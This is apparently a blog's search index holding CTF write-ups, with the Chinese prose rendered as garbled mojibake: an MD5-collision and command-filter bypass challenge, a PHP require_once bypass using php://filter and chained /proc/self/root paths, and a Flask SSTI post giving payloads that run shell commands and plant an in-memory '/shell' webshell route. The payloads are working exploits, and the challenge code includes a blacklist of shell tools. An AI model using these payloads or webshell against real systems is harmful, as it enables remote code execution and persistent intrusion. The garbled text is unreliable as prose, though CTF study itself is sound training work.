<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>å®‰æ´µæ¯2019</title>
    <link href="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/"/>
    <url>/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/</url>
    
    <content type="html"><![CDATA[<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>è¿›å…¥é¢˜ç›®è§‚å¯Ÿåˆ°urlæœ‰ç‚¹ä¿¡æ¯ç‰¹åˆ«æ˜¯cmdå’Œimg</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301021518301.png" class title="image-20250301021518301"><p>å°è¯•cmd&#x3D;lså‘ç°è¢«ç¦æ­¢äº†è¯´æ˜Index.phpä¸­æœ‰wafç¦æ­¢äº†ä¸€äº›å‚æ•°ï¼Œå…·ä½“åªæœ‰çœ‹åˆ°index.phpæºç æ‰èƒ½è¿›ä¸€æ­¥åˆ¤æ–­</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301021703936.png" class title="image-20250301021703936"><p>æ¥ä¸‹æ¥å°±çœ‹åˆ°äº†imgè¿™ä¸ªå‚æ•°çœ‹èµ·æ¥æœ‰ç‚¹æƒ³æ˜¯base64ç¼–ç åçš„</p><p>å½“æ—¶çœ‹åˆ°æœ‰è¿™ä¸ªï¼ˆçº¢è‰²æ ‡è®°çš„åœ°æ–¹ï¼‰æˆ‘å°±ä¸€ç›´ç‚¹æ²¡æƒ³åˆ°åå¤´å°±çœŸæœ‰ä¸œè¥¿å‡ºæ¥</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022115433.png" class title="image-20250301022115433"><p>æœ€åçš„ç»“æœå°±æ˜¯555.pngï¼Œå”‰å½“æ—¶çœ‹åˆ°555.pngè¿˜æ˜¯æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå½“æ—¶ä¸æ™“å¾—ä¸ºä»€ä¹ˆè¿˜æƒ³å°†444.pngå’Œ333.pngé‡æ–°æŒ‰ç…§555.pngç¼–ç </p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022207228.png" class title="image-20250301022207228"><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022454088.png" class title="image-20250301022454088"><p>ç»“æœæ˜¯æ²¡æœ‰ä»»ä½•ååº”ï¼Œå½“æ—¶å°±å¡ä½äº†æ²¡æœ‰ä¸€ç‚¹æ€è·¯ï¼Œåé¢çœ‹åˆ°wpæ‰æ™“å¾—è¿™ä¸ªæ—¶å€™åº”è¯¥æ˜¯ç¼–ç index.phpè€Œä¸æ˜¯ä½ èƒ¡æƒ³çš„å‚æ•°ï¼ˆç°åœ¨æƒ³æ¥ä¹Ÿæ˜¯ï¼Œæ²¡æºç ä½ è¿™ä¸ªé¢˜ä½ æ ¹æœ¬å°±åšä¸äº†ï¼Œæ‰€ä»¥ä¸€åˆ‡éƒ½è¦å›´ç»•çœ‹åˆ°index.phpçš„æºç å‰æä¸‹ï¼‰</p><p>è§‚å¯Ÿåˆ°æœ‰base64ï¼Œä¼°è®¡index.phpçš„å†…å®¹ç»è¿‡base64ç¼–ç äº†ï¼ˆå…¶å®å½“æ—¶ï¼Œæˆ‘è®¿é—®äº†555.pngå¹¶ä¸”å°†å›¾ç‰‡ä¸‹è½½äº†æœ¬åœ°ç„¶åbase64ç¼–ç äº†ä¸€æ¬¡å°±å’Œimg src&#x3D;â€™dataâ€™:images&#x2F;gif;base,å†…å®¹å¤ªå¤šäº†å°±ä¸æ²¾äº†ï¼Œä¸€æ ·äº†ï¼‰</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301023113411.png" class title="image-20250301023113411"><p>ç®€å•çš„ä»£ç å®¡è®¡ä¸»è¦è€ƒç‚¹æ˜¯md5å¼ºæ¯”è¾ƒç»•è¿‡ä¹‹å‰åšè¿‡basectf2024ä¹Ÿæ˜¯è€ƒåˆ°ä¸€æ ·çš„ç‚¹ï¼Œæ²¡æƒ³åˆ°è¿™2019å‡ºçš„é¢˜å¯¹2024éƒ½è¿˜æœ‰å¸®åŠ©ï¼Œå¯è§è¿™é¢˜æ˜¯å¤šä¹ˆçš„ç»å…¸ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>æ²¡å•¥å¥½è¯´çš„ç›´æ¥ç”¨å·¥å…·fastcollã€‚å·¥å…·çš„ä½¿ç”¨fastcoll.exe -o a a1ï¼Œç”Ÿæˆçš„ä¸¤ä¸ªæ–‡ä»¶aï¼Œa1å°±æ˜¯ä¸¤ä¸ªä¸åŒæ–‡ä»¶ä½†md5åæ˜¯ç›¸åŒçš„æœ€åç»è¿‡urlencodeä¸€æ¬¡å°±è¡Œï¼ˆå½“æ—¶æˆ‘æƒ³å·æ‡’ç›´æ¥åœ¨Cyberä¸Šç›´æ¥ç¼–ç ï¼Œå‘ç°ä¼ ä¸Šå»çš„æ•°æ®æ€ä¹ˆä¹Ÿä¸å¯¹ï¼Œæ— è¯­ğŸ˜¶ï¼Œæœ€åå†™äº†ä¸‹ä»£ç æ‰æˆåŠŸï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;a1&#x27;</span>));<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=%EE%AA%03%C7Iz%28%1F%9E%1FX%B0%F3%0C%F7L%24%E5F%E7%F7%3BV%CAO69%C6%D308%D2Z%F3%BA%04%ECh-Ek%04g%B2%A2%3B%14%1AR%7C%EBA%F2%95%24%A59%15%0Dp%13%8C%ED%C5%D7%15%E2%7F%B7%9E%AE%F3%DC%87v%3Ck%F6%AE%BDy%D5q%C5x%01%BF%0B%EC%08a%16O%C7%9D%8D%09%B0v%3FOw%3B%87%7Ef%09J%8B%D4%FD%9B%D20%21g%95%D8Cm%AE%93%B5%EC%89%3F%13%DD&amp;b=%EE%AA%03%C7Iz%28%1F%9E%1FX%B0%F3%0C%F7L%24%E5Fg%F7%3BV%CAO69%C6%D308%D2Z%F3%BA%04%ECh-Ek%04g%B2%A2%BB%14%1AR%7C%EBA%F2%95%24%A59%15%0D%F0%13%8C%ED%C5%D7%15%E2%7F%B7%9E%AE%F3%DC%87v%3Ck%F6%AE%BDy%D5qEx%01%BF%0B%EC%08a%16O%C7%9D%8D%09%B0v%3FOw%3B%87%7Ef%09J%8BT%FD%9B%D20%21g%95%D8Cm%AE%93%B5l%89%3F%13%DD<br></code></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªè¿‡æ»¤äº†å¾ˆå¤šå°±æ˜¯æ²¡è¿‡æ»¤dirå’Œè¦ç”¨catçš„è¯åæ–œæ ç»•è¿‡ï¼ˆ\ï¼‰å³å¯</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301024747849.png" class title="image-20250301024747849"><p>æœ€åç®€å•æ€»ç»“ä¸‹ï¼šé¢˜ç›®è™½ç„¶ä¸æ˜¯å¾ˆéš¾ï¼Œå¯¹æˆ‘æ¥è¯´å”¯ä¸€éš¾ç‚¹å°±æ˜¯æ‰¾index.phpçš„æºç å…¶ä»–æ²¡å•¥over</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜2024</title>
    <link href="/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/"/>
    <url>/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/</url>
    
    <content type="html"><![CDATA[<h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez include"></a>ez include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;starven_secret.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿˜æƒ³éé¢„æœŸ?&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="éœ€è¦ç»•è¿‡require-onceï¼š"><a href="#éœ€è¦ç»•è¿‡require-onceï¼š" class="headerlink" title="éœ€è¦ç»•è¿‡require_onceï¼š"></a>éœ€è¦ç»•è¿‡require_onceï¼š</h4><p>phpçš„æ–‡ä»¶åŒ…å«æœºåˆ¶æ˜¯å°†<strong>å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­</strong>ï¼Œå½“å·²ç»require_once(â€˜starven_secret.phpâ€™)ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†require_onceã€‚è¿™é‡Œéœ€è¦ç»•è¿‡require_onceï¼Œ<strong>è®©phpè®¤ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åä¸åœ¨å“ˆå¸Œè¡¨ä¸­ï¼Œåˆå¯ä»¥è®©phpèƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œè¯»å–åˆ°å†…å®¹ã€‚</strong></p><p>çŸ¥è¯†ç‚¹ï¼š&#x2F;proc&#x2F;selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„&#x2F;proc&#x2F;pid&#x2F;ï¼Œ&#x2F;proc&#x2F;self&#x2F;root&#x2F;æ˜¯æŒ‡å‘&#x2F;çš„ç¬¦å·é“¾æ¥ï¼Œrequire_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ã€‚</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒå…³ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>];<br>    <span class="hljs-variable">$hint</span> = <span class="hljs-string">&quot;register_argc_argv = On&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hintéƒ½ç»™çš„è¿™ä¹ˆæ˜æ˜¾äº†è¿˜ä¸ä¼šåš?&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], -<span class="hljs-number">4</span>) === <span class="hljs-string">&#x27;.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨pearcmd-phpæ–‡ä»¶åŒ…å«"><a href="#åˆ©ç”¨pearcmd-phpæ–‡ä»¶åŒ…å«" class="headerlink" title="åˆ©ç”¨pearcmd.phpæ–‡ä»¶åŒ…å«"></a>åˆ©ç”¨pearcmd.phpæ–‡ä»¶åŒ…å«</h4><p><code>register_argc_argv</code> å¼€å¯çš„æƒ…å†µä¸‹ï¼Œurlä¸­?åé¢çš„å†…å®¹éƒ½ä¼šä¼ å…¥$_SERVER[â€˜argvâ€™]è¿™ä¸ªå˜é‡é‡Œï¼Œå¹¶ä¸”&amp;æ˜¯æ— æ³•åˆ†å‰²å‚æ•°çš„ï¼ŒçœŸæ­£èƒ½æœ‰æ•ˆåˆ†å‰²å‚æ•°çš„æ˜¯+å·ã€‚</p><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®šâ€“with-pearæ‰ä¼šå®‰è£…ã€‚ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel&#x2F;pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨&#x2F;usr&#x2F;local&#x2F;lib&#x2F;phpã€‚</p><img src="/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/image-20250204200400997.png" class title="image-20250204200400997"><p>æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯config-createå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Flaskå†…å­˜ğŸ</title>
    <link href="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="å­˜åœ¨flask-sstiæ¼æ´ç¯å¢ƒ"><a href="#å­˜åœ¨flask-sstiæ¼æ´ç¯å¢ƒ" class="headerlink" title="å­˜åœ¨flask sstiæ¼æ´ç¯å¢ƒ"></a>å­˜åœ¨flask sstiæ¼æ´ç¯å¢ƒ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    person = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h2 id="å¼€å¯äº†debugæ¨¡å¼ä¸‹çš„ä¸å‡ºç½‘å›æ˜¾"><a href="#å¼€å¯äº†debugæ¨¡å¼ä¸‹çš„ä¸å‡ºç½‘å›æ˜¾" class="headerlink" title="å¼€å¯äº†debugæ¨¡å¼ä¸‹çš„ä¸å‡ºç½‘å›æ˜¾"></a>å¼€å¯äº†debugæ¨¡å¼ä¸‹çš„ä¸å‡ºç½‘å›æ˜¾</h2><p>åœ¨debugæ¨¡å¼ä¸‹ï¼ŒæŠ¥é”™ä¼šå¸¦å‡ºè¯¦ç»†ä¿¡æ¯ï¼Œdebugæ¨¡å¼å¸¸è§çš„è€ƒç‚¹æœ‰ç®—pinç è¿›consoleæ¥å‘½ä»¤æ‰§è¡Œ</p><p>å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨æŠ¥é”™<code>raise Exception()</code>çš„æ–¹å¼æ¥è®©æˆ‘ä»¬çš„å‘½ä»¤å›æ˜¾</p><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203182013486.png" class title="image-20250203182013486"><h2 id="ä½ç‰ˆæœ¬flaskå†…å­˜ğŸç¯å¢ƒï¼š"><a href="#ä½ç‰ˆæœ¬flaskå†…å­˜ğŸç¯å¢ƒï¼š" class="headerlink" title="ä½ç‰ˆæœ¬flaskå†…å­˜ğŸç¯å¢ƒï¼š"></a>ä½ç‰ˆæœ¬flaskå†…å­˜ğŸç¯å¢ƒï¼š</h2><ul><li>flask 2.0.1</li><li>werkzeug 2.2.2</li></ul><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä¸‹è¿™ä¸ªpayloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json">url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;__builtins__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;eval&#x27;<span class="hljs-punctuation">]</span>(<br><span class="hljs-string">&quot;app.add_url_rule(</span><br><span class="hljs-string">&#x27;/shell&#x27;, </span><br><span class="hljs-string">&#x27;shell&#x27;, </span><br><span class="hljs-string">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>&#x27;app&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;current_app&#x27;<span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>é¦–å…ˆ<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>è¿™å°±æ˜¯ä¸€ä¸ªsstiè·å–evalå‡½æ•°çš„payloadï¼Œurl_foræ˜¯Flaskçš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå…¶å‘½åç©ºé—´åŒ…å«å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬æˆ‘ä»¬å¾…ä¼šéœ€è¦æ‹¿çš„å½“å‰åº”ç”¨çš„ä¸Šä¸‹æ–‡ã€‚</p><h4 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule:"></a>add_url_rule:</h4><p>Flaskæ³¨å†Œè·¯ç”±æ˜¯ä½¿ç”¨@app.route()è£…é¥°å™¨æ¥å®ç°</p><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203183141232.png" class title="image-20250203183141232"><p>è¿™é‡Œä½¿ç”¨äº†add_url_ruleæ¥æ·»åŠ 